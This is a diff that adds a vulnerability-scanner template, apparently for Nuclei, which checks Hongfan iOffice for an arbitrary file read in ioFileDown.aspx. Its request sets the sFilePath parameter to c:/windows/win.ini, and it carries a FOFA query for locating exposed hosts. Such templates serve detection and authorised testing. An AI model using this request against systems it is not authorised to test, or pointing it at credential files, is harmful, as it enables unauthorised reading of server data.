@@ -1,0 +1,33 @@
+id: hongfan-ioffice-iofiledown-fileread
+
+info:
+  name: 红帆 iOffice ioFileDown.aspx 任意文件读取
+  author: fgz
+  severity: high
+  description: |
+    红帆 iOffice /ioffice/prg/interface/ioFileDown.aspx 的 sFilePath 参数可读取服务器文件，响应体出现 win.ini 特征段。
+  reference:
+    - https://mp.weixin.qq.com/s/89oqmTU-kPx_83ZtZFdVaA
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="红帆-ioffice"
+  tags: hongfan,ioffice,lfi,fileread
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ioffice/prg/interface/ioFileDown.aspx?sFilePath=c:/windows/win.ini"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
+      - type: status
+        status:
+          - 200
